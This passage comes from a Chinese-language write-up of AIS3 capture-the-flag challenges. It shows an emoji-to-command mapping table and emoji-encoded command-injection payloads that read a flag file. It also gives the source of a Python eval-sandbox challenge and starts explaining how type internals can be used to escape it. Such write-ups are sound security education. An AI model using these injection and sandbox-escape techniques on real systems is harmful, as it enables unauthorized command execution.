class="string">&quot;🐤&quot;</span>: <span class="string">&quot;baby chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐣&quot;</span>: <span class="string">&quot;hatching chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐥&quot;</span>: <span class="string">&quot;front-facing baby chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦆&quot;</span>: <span class="string">&quot;duck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦅&quot;</span>: <span class="string">&quot;eagle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦉&quot;</span>: <span class="string">&quot;owl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦇&quot;</span>: <span class="string">&quot;bat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐺&quot;</span>: <span class="string">&quot;wolf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐗&quot;</span>: <span class="string">&quot;boar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐴&quot;</span>: <span class="string">&quot;horse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦄&quot;</span>: <span class="string">&quot;unicorn&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐝&quot;</span>: <span class="string">&quot;bee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐛&quot;</span>: <span class="string">&quot;bug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦋&quot;</span>: <span class="string">&quot;butterfly&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐌&quot;</span>: <span class="string">&quot;snail&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐞&quot;</span>: <span class="string">&quot;lady beetle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐜&quot;</span>: <span class="string">&quot;ant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦟&quot;</span>: <span class="string">&quot;mosquito&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦗&quot;</span>: <span class="string">&quot;cricket&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕷️&quot;</span>: <span class="string">&quot;spider&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕸️&quot;</span>: <span class="string">&quot;spider web&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦂&quot;</span>: <span class="string">&quot;scorpion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐢&quot;</span>: <span class="string">&quot;turtle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐍&quot;</span>: <span class="string">&quot;python&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦎&quot;</span>: <span class="string">&quot;lizard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦖&quot;</span>: <span class="string">&quot;T-Rex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦕&quot;</span>: <span class="string">&quot;sauropod&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐙&quot;</span>: <span class="string">&quot;octopus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦑&quot;</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦐&quot;</span>: <span class="string">&quot;shrimp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦞&quot;</span>: <span class="string">&quot;lobster&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦀&quot;</span>: <span class="string">&quot;crab&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐡&quot;</span>: <span class="string">&quot;blowfish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐠&quot;</span>: <span class="string">&quot;tropical fish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐟&quot;</span>: <span class="string">&quot;fish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐬&quot;</span>: <span class="string">&quot;dolphin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐳&quot;</span>: <span class="string">&quot;whale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐋&quot;</span>: <span class="string">&quot;whale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦈&quot;</span>: <span class="string">&quot;shark&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐊&quot;</span>: <span class="string">&quot;crocodile&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐅&quot;</span>: <span class="string">&quot;tiger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐆&quot;</span>: <span class="string">&quot;leopard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦓&quot;</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦍&quot;</span>: <span class="string">&quot;gorilla&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦧&quot;</span>: <span class="string">&quot;orangutan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦣&quot;</span>: <span class="string">&quot;mammoth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐘&quot;</span>: <span class="string">&quot;elephant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦛&quot;</span>: <span class="string">&quot;hippopotamus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦏&quot;</span>: <span class="string">&quot;rhinoceros&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐪&quot;</span>: <span class="string">&quot;camel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐫&quot;</span>: <span class="string">&quot;two-hump camel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦒&quot;</span>: <span class="string">&quot;giraffe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦘&quot;</span>: <span class="string">&quot;kangaroo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦬&quot;</span>: <span class="string">&quot;bison&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦥&quot;</span>: <span class="string">&quot;sloth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦦&quot;</span>: <span class="string">&quot;otter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦨&quot;</span>: <span class="string">&quot;skunk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦡&quot;</span>: <span class="string">&quot;badger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐾&quot;</span>: <span class="string">&quot;paw prints&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◼️&quot;</span>: <span class="string">&quot;black square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◻️&quot;</span>: <span class="string">&quot;white square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◾&quot;</span>: <span class="string">&quot;black medium square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◽&quot;</span>: <span class="string">&quot;white medium square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;▪️&quot;</span>: <span class="string">&quot;black small square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;▫️&quot;</span>: <span class="string">&quot;white small square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔶&quot;</span>: <span class="string">&quot;large orange diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔷&quot;</span>: <span class="string">&quot;large blue diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔸&quot;</span>: <span class="string">&quot;small orange diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔹&quot;</span>: <span class="string">&quot;small blue diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔺&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔻&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔼&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔽&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔘&quot;</span>: <span class="string">&quot;circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⚪&quot;</span>: <span class="string">&quot;circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⚫&quot;</span>: <span class="string">&quot;black circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟠&quot;</span>: <span class="string">&quot;orange circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟢&quot;</span>: <span class="string">&quot;green circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔵&quot;</span>: <span class="string">&quot;blue circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟣&quot;</span>: <span class="string">&quot;purple circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟡&quot;</span>: <span class="string">&quot;yellow circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟤&quot;</span>: <span class="string">&quot;brown circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⭕&quot;</span>: <span class="string">&quot;empty circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅰️&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅱️&quot;</span>: <span class="string">&quot;B&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅾️&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ℹ️&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅿️&quot;</span>: <span class="string">&quot;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Ⓜ️&quot;</span>: <span class="string">&quot;M&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆎&quot;</span>: <span class="string">&quot;AB&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆑&quot;</span>: <span class="string">&quot;CL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆒&quot;</span>: <span class="string">&quot;COOL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆓&quot;</span>: <span class="string">&quot;FREE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆔&quot;</span>: <span class="string">&quot;ID&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆕&quot;</span>: <span class="string">&quot;NEW&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆖&quot;</span>: <span class="string">&quot;NG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆗&quot;</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆘&quot;</span>: <span class="string">&quot;SOS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆙&quot;</span>: <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆚&quot;</span>: <span class="string">&quot;VS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;㊗️&quot;</span>: <span class="string">&quot;祝&quot;</span>,</span><br><span class="line">    <span class="string">&quot;㊙️&quot;</span>: <span class="string">&quot;秘&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈺&quot;</span>: <span class="string">&quot;營&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈯&quot;</span>: <span class="string">&quot;指&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🉐&quot;</span>: <span class="string">&quot;得&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈹&quot;</span>: <span class="string">&quot;割&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈚&quot;</span>: <span class="string">&quot;無&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈲&quot;</span>: <span class="string">&quot;禁&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈸&quot;</span>: <span class="string">&quot;申&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈴&quot;</span>: <span class="string">&quot;合&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈳&quot;</span>: <span class="string">&quot;空&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈵&quot;</span>: <span class="string">&quot;滿&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈶&quot;</span>: <span class="string">&quot;有&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈷️&quot;</span>: <span class="string">&quot;月&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚗&quot;</span>: <span class="string">&quot;car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚕&quot;</span>: <span class="string">&quot;taxi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚙&quot;</span>: <span class="string">&quot;SUV&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚌&quot;</span>: <span class="string">&quot;bus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚎&quot;</span>: <span class="string">&quot;trolleybus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🏎️&quot;</span>: <span class="string">&quot;race car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚓&quot;</span>: <span class="string">&quot;police car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚑&quot;</span>: <span class="string">&quot;ambulance&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚒&quot;</span>: <span class="string">&quot;fire engine&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚐&quot;</span>: <span class="string">&quot;minibus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚚&quot;</span>: <span class="string">&quot;delivery truck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚛&quot;</span>: <span class="string">&quot;articulated lorry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚜&quot;</span>: <span class="string">&quot;tractor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛴&quot;</span>: <span class="string">&quot;kick scooter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚲&quot;</span>: <span class="string">&quot;bicycle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛵&quot;</span>: <span class="string">&quot;scooter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🏍️&quot;</span>: <span class="string">&quot;motorcycle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;✈️&quot;</span>: <span class="string">&quot;airplane&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚀&quot;</span>: <span class="string">&quot;rocket&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛸&quot;</span>: <span class="string">&quot;UFO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚁&quot;</span>: <span class="string">&quot;helicopter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛶&quot;</span>: <span class="string">&quot;canoe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⛵&quot;</span>: <span class="string">&quot;sailboat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚤&quot;</span>: <span class="string">&quot;speedboat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛳️&quot;</span>: <span class="string">&quot;passenger ship&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⛴️&quot;</span>: <span class="string">&quot;ferry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛥️&quot;</span>: <span class="string">&quot;motor boat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚢&quot;</span>: <span class="string">&quot;ship&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👨&quot;</span>: <span class="string">&quot;man&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👩&quot;</span>: <span class="string">&quot;woman&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👶&quot;</span>: <span class="string">&quot;baby&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🧓&quot;</span>: <span class="string">&quot;old man&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👵&quot;</span>: <span class="string">&quot;old woman&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💿&quot;</span>: <span class="string">&quot;CD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📀&quot;</span>: <span class="string">&quot;DVD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📱&quot;</span>: <span class="string">&quot;phone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💻&quot;</span>: <span class="string">&quot;laptop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖥️&quot;</span>: <span class="string">&quot;pc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖨️&quot;</span>: <span class="string">&quot;printer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⌨️&quot;</span>: <span class="string">&quot;keyboard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖱️&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖲️&quot;</span>: <span class="string">&quot;trackball&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕹️&quot;</span>: <span class="string">&quot;joystick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🗜️&quot;</span>: <span class="string">&quot;clamp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💾&quot;</span>: <span class="string">&quot;floppy disk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💽&quot;</span>: <span class="string">&quot;minidisc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;☎️&quot;</span>: <span class="string">&quot;telephone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📟&quot;</span>: <span class="string">&quot;pager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📺&quot;</span>: <span class="string">&quot;television&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📻&quot;</span>: <span class="string">&quot;radio&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🎙️&quot;</span>: <span class="string">&quot;studio microphone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🎚️&quot;</span>: <span class="string">&quot;level slider&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🎛️&quot;</span>: <span class="string">&quot;control knobs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⏰&quot;</span>: <span class="string">&quot;alarm clock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕰️&quot;</span>: <span class="string">&quot;mantelpiece clock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⌚&quot;</span>: <span class="string">&quot;watch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📡&quot;</span>: <span class="string">&quot;satellite antenna&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔋&quot;</span>: <span class="string">&quot;battery&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔌&quot;</span>: <span class="string">&quot;plug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚩&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⓿&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❶&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❷&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❸&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❹&quot;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❺&quot;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❻&quot;</span>: <span class="string">&quot;6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❼&quot;</span>: <span class="string">&quot;7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❽&quot;</span>: <span class="string">&quot;8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❾&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❿&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⭐&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;➕&quot;</span>: <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    <span class="string">&quot;➖&quot;</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;✖️&quot;</span>: <span class="string">&quot;×&quot;</span>,</span><br><span class="line">    <span class="string">&quot;➗&quot;</span>: <span class="string">&quot;÷&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;cat: flag: Is a directory</span><br><span class="line">cat: templates: Is a directory</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>現在我們得到一個json有所有指令的對照表，並且可以知道flag應該是在 <code>flag</code> 的資料夾。</p>
<p>嘗試 <code>cat</code> flag 資料夾裡面的東西，可以從剛剛 dump 出來的 json 找可以用的指令，這邊使用<code>;/</code>和<code>:|</code>切割指令，回傳的結果似乎是一個 python file</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">💿 🚩😓😑🐱 ⭐ <span class="comment">#cd flag;/:|</span></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag-printer.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read())</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>執行python，get flag<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">💿 🚩😓😑🐍❸ 🚩➖🖨️⭐</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}</p>
</blockquote>
<h2 id="Can-you-describe-Pyjail"><a href="#Can-you-describe-Pyjail" class="headerlink" title="Can you describe Pyjail?"></a>Can you describe Pyjail?</h2><blockquote>
<p>Yet another 🐍 ⛓️.<br>nc chals1.ais3.org 48763<br>Author: Vincent55</p>
</blockquote>
<p>這題不是我出的，但是 Vincent 大佬出的題目還是要捧場一下</p>
<h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p>看source code可以知道是很純的pyjail，在 <code>safe_eval</code> 裡面就把該 ban 的都 ban 光了</p>
<p><del>跟前面那題 evil calculator 比起來 calculator 一點都不 evil</del></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> safe_eval <span class="keyword">import</span> safe_eval</span><br><span class="line"><span class="keyword">from</span> inspect <span class="keyword">import</span> getdoc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Desc</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Welcome to my 🐍 ⛓️</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get__</span>(<span class="params">self, objname, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;conf&quot;</span>).flag</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">desc_helper</span>(<span class="params">self, name</span>):</span><br><span class="line">        origin = <span class="built_in">getattr</span>(<span class="built_in">type</span>, name)</span><br><span class="line">        <span class="keyword">if</span> origin == <span class="built_in">type</span>.__getattribute__:</span><br><span class="line">            <span class="keyword">raise</span> NameError(</span><br><span class="line">                <span class="string">&quot;Access to forbidden name %r (%r)&quot;</span> % (name, <span class="string">&quot;__getattribute__&quot;</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="variable language_">self</span>.helper = origin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    desc = Desc()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = Test()</span><br><span class="line">test.desc = <span class="string">&quot;flag&#123;fakeflag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Just a tricky way to print a welcome message, or maybe a hint :/</span></span><br><span class="line"><span class="comment"># You can just `print(getdoc(Desc))`</span></span><br><span class="line"><span class="comment"># This is not part of the challenge, but if you can get the flag through here, please contact @Vincent55.</span></span><br><span class="line">welcome_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__base__&quot;)</span></span><br><span class="line"><span class="string">Obj := desctmp.helper</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__subclasses__&quot;)</span></span><br><span class="line"><span class="string">print(getdoc(desctmp.helper(Obj)[-2]))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;,&quot;</span>)</span><br><span class="line">welcome_msg = <span class="string">f&quot;(<span class="subst">&#123;welcome_msg&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">safe_eval(</span><br><span class="line">    welcome_msg,</span><br><span class="line">    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Desc&quot;</span>: Desc, <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>, <span class="string">&quot;getdoc&quot;</span>: getdoc&#125;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your challenge begin here!</span></span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;✏️: &quot;</span>)</span><br><span class="line"></span><br><span class="line">safe_eval(</span><br><span class="line">    payload,</span><br><span class="line">    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Desc&quot;</span>: Desc&#125;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f&quot;test.__dict__: &#123;test.__dict__&#125;&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;🚩: <span class="subst">&#123;test.desc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看完 source code 可以發現他在print <code>welcome_msg</code> 的時候用了一個非常詭異的方法，也算是這題的題示。</p>
<h3 id="welcome-msg到底在幹嘛"><a href="#welcome-msg到底在幹嘛" class="headerlink" title="welcome_msg到底在幹嘛"></a>welcome_msg到底在幹嘛</h3><p>首先看到下面這段程式碼：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">welcome_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__base__&quot;)</span></span><br><span class="line"><span class="string">Obj := desctmp.helper</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__subclasses__&quot;)</span></span><br><span class="line"><span class="string">print(getdoc(desctmp.helper(Obj)[-2]))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;,&quot;</span>)</span><br><span class="line">welcome_msg = <span class="string">f&quot;(<span class="subst">&#123;welcome_msg&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">safe_eval(</span><br><span class="line">    welcome_msg,</span><br><span class="line">    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Desc&quot;</span>: Desc, <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>, <span class="string">&quot;getdoc&quot;</span>: getdoc&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>其實會發現你可以透過 <code>getattr(type, name)</code> 取得<code>type</code>底下的attribute<br>這裡會卡一個知識點，就是當你要取得某個 class 的 subclass 的時候(假設是 str )，會寫 <code>str.__subclasses__()</code> ，但其實可以寫成 <code>type.__subclasses__(str)</code> ，前提是 <code>str</code> 的 <code>class</code> 必須是 <code>type</code></p>
